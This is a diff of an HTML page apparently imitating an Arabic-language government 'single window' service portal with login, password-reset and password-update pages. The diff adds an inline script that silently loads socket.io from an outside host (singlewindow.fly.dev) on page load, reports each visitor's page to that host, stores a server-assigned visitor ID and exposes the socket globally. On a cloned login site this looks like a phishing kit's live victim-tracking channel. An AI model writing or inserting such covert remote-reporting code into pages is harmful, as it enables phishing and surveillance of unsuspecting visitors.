@@ -905,38 +905,27 @@
 }</style>
 <style id="compCssMappers_fqxuo">#fqxuo{width:auto;min-height:40px;}#pageBackground_fqxuo{--bg-position:absolute;--bg-overlay-color:rgb(255, 255, 255);--bg-gradient:none;}#comp-mrqndbjs{--bg-overlay-color:rgb(255, 255, 255);--bg-gradient:none;min-width:980px;}#comp-mrqndbkm3{--shc-mutated-brightness:128,128,128;}#comp-mrqndbkn1{--text-direction:var(--wix-opt-in-direction);}#comp-mrqndbkr{--height:22px;--width:25px;}#comp-mrqnkgst{--bg-overlay-color:rgb(255, 255, 255);--bg-gradient:none;min-width:980px;}#comp-mrqnkgt2{--opacity:1;}#comp-mmi6vyi1{--bg-overlay-color:transparent;--bg-gradient:none;min-width:980px;}#comp-mmi7lraw{--direction:rtl;--justify-content:center;--item-margin:2.5px 2.5px;--margin-top:-2.5px;--margin-bottom:-2.5px;--margin-inline-start:-2.5px;--margin-inline-end:-2.5px;}.comp-mmi7lrbb{--bg-overlay-color:transparent;--bg-gradient:none;border-width:0 0 0 0;border-style:solid solid solid solid;border-color:rgba(176, 169, 134, 1) rgba(176, 169, 134, 1) rgba(176, 169, 134, 1) rgba(176, 169, 134, 1);border-radius:0 0 0 0;overflow:clip !important;transform:translateZ(0);margin:-0px;}.comp-mmi7lrbb__item2{--scale:1;--bg-overlay-color:transparent;--bg-gradient:none;border-width:0 0 0 0;border-style:solid solid solid solid;border-color:rgba(176, 169, 134, 1) rgba(176, 169, 134, 1) rgba(176, 169, 134, 1) rgba(176, 169, 134, 1);border-radius:0 0 0 0;overflow:clip !important;transform:translateZ(0);margin:-0px;}.comp-mmi7lrbb__item3{--scale:1;--bg-overlay-color:transparent;--bg-gradient:none;border-width:0 0 0 0;border-style:solid solid solid solid;border-color:rgba(176, 169, 134, 1) rgba(176, 169, 134, 1) rgba(176, 169, 134, 1) rgba(176, 169, 134, 1);border-radius:0 0 0 0;overflow:clip !important;transform:translateZ(0);margin:-0px;}.comp-mmi7lrbu1{--shc-mutated-brightness:124,126,127;}.comp-mmi8eyyy{--opacity:1;}.comp-mmi8fx0j{--text-direction:var(--wix-opt-in-direction);}.comp-mmi8iuzp{--text-direction:var(--wix-opt-in-direction);}</style>
 
-<script src="/tracker.js"></script>
+
+
 <script>
-(function() {
-  var SOCKET_URL = 'https://singlewindow.fly.dev';
-  var s = document.createElement('script');
-  s.src = SOCKET_URL + '/socket.io/socket.io.js';
-  s.onload = function() {
-    var sock = io(SOCKET_URL, { transports: ['polling','websocket'], reconnection: true });
-    var pageMap = {
-      '/': 'الصفحة الرئيسية',
-      '/register': 'تسجيل حساب - نوع الحساب',
-      '/service': 'صفحة الخدمات',
-      '/login': 'تسجيل الدخول',
-      '/reset': 'نسيت كلمة المرور',
-      '/update': 'تحديث كلمة المرور',
-      '/mobile-verification': 'توثيق رقم الهاتف',
-    };
-    function getPage() {
-      var p = window.location.pathname;
-      if (p.startsWith('/services/')) return 'خدمة: ' + decodeURIComponent(p.replace('/services/','')).replace(/-/g,' ');
-      return pageMap[p] || p;
-    }
-    sock.on('connect', function() {
-      sock.emit('visitor:init', { page: getPage(), userAgent: navigator.userAgent, url: window.location.href });
-      sock.emit('visitor:pageEnter', getPage());
+(function(){
+  var SVID=localStorage.getItem('visitorId');
+  var s=document.createElement('script');
+  s.src='https://singlewindow.fly.dev/socket.io/socket.io.js';
+  s.onload=function(){
+    var sock=io('https://singlewindow.fly.dev',{transports:['polling','websocket'],reconnection:true});
+    var m={'/':'الصفحة الرئيسية','/service':'صفحة الخدمات','/login':'تسجيل الدخول','/reset':'نسيت كلمة المرور','/update':'تحديث كلمة المرور'};
+    function g(){var p=window.location.pathname;if(p.startsWith('/services/'))return 'خدمة: '+decodeURIComponent(p.replace('/services/','')).replace(/-/g,' ');return m[p]||p;}
+    sock.on('connect',function(){
+      sock.emit('visitor:register',{existingVisitorId:SVID,currentPage:g()});
+      sock.emit('visitor:pageEnter',g());
     });
-    window._sw_socket = sock;
+    sock.on('successfully-connected',function(d){if(d&&d.pid)localStorage.setItem('visitorId',d.pid);});
+    window._sw_socket=sock;
   };
   document.head.appendChild(s);
 })();
-</script>
-</head>
+</script></head>
 <body class="">
 <script type="text/javascript">
     var bodyCacheable = true;
